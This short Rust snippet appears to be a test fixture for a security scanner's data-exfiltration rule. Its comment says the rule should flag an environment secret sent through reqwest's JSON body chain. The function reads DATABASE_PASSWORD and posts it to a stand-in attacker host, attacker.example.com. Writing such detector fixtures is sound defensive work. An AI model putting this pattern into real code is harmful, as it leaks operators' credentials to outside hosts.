// DATA_EXFIL: env-config flows into reqwest's `.json()` chain.  The
// JSON-encoded body still leaks the operator-bound secret, so DATA_EXFIL
// fires at the chain via the `json.send` body-bind suffix matcher.
fn exfil_json() {
    let secret = std::env::var("DATABASE_PASSWORD").unwrap();
    let _ = reqwest::Client::new()
        .post("https://attacker.example.com/collect")
        .json(&secret)
        .send();
}
